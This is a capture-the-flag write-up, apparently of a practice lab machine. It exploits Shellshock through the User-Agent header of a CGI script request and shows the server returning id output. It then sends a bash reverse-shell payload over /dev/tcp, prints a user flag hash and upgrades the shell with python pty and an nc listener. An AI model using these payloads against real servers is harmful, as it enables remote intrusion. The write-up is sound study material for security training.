## Shellshock

```
GET /cgi-bin/user.sh HTTP/1.1
Host: 10.10.10.56
User-Agent: () { :;}; echo; /usr/bin/id
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

* User-Agent field is a common string to store as an environmental variable
* we can input `() { :;}; echo; /usr/bin/id` under User-Agent and we get back a response
* note that we add in an echo command before using the full path of id to execute the command
	* echo adds a new line which is needed to differentiate between the headers and the body
	* we have to use the full path because a profile has not been set so there is no $PATH 
```
HTTP/1.1 200 OK
Date: Tue, 19 Apr 2022 02:13:39 GMT
Server: Apache/2.4.18 (Ubuntu)
Connection: close
Content-Type: text/x-sh
Content-Length: 129

uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

* let's try to get a reverse shell from this

```
GET /cgi-bin/user.sh HTTP/1.1
Host: 10.10.10.56
User-Agent: () { :;}; echo; /bin/bash -c 'bash >& /dev/tcp/10.10.16.8/9000 0>&1'
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

* `bash -c` loads a profile which then populates the PATH env variable which allows us to just call `bash -i` instead of `/bin/bash -i`
* we get a shell but it's simple, let's upgrade it
* user.txt - `2ec24e11320026d1e70ff3e16695b233`

## Upgrade to Interactive Shell

* python3 is installed so let's use this to upgrade our shell
* `python3 -c 'import pty; pty.spawn("/bin/bash")'`
* `ctrl + z`
* `stty raw -echo; fg`
* `reset`
```
[2]  - continued  nc -nlvp 9000
                               reset
reset: unknown terminal type unknown
Terminal type? xterm
```


